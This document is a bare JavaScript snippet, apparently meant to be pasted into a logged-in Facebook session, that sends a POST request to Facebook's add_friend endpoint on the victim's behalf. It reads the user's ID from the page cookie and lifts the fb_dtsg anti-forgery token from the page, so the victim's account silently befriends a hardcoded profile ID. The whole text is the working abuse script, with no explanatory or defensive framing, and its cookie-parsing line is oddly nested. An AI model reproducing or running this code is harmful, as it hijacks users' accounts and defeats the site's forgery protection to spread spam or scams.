var http4 = new XMLHttpRequest();
var url4 = "//www.facebook.com/ajax/add_friend/action.php?dpr=1";
var params4 = "to_friend=100003085666469&action=add_friend&how_found=profile_browser&ref_param=pb_reactions&outgoing_id=&logging_location=&no_flyout_on_click=true&ego_log_data&http_referer&floc=list_of_people&__user="+document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1])+"&__a=1&fb_dtsg="+document.getElementsByName('fb_dtsg')[0].value+"&ttstamp=";
http4.open("POST", url4, true);
http4.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
http4.setRequestHeader("Content-length", params4.length);
http4.setRequestHeader("Connection", "close");
 
http4.onreadystatechange = function() {
if(http4.readyState == 4 && http4.status == 200) {
 
http4.close; 
 
}
}
 
http4.send(params4);
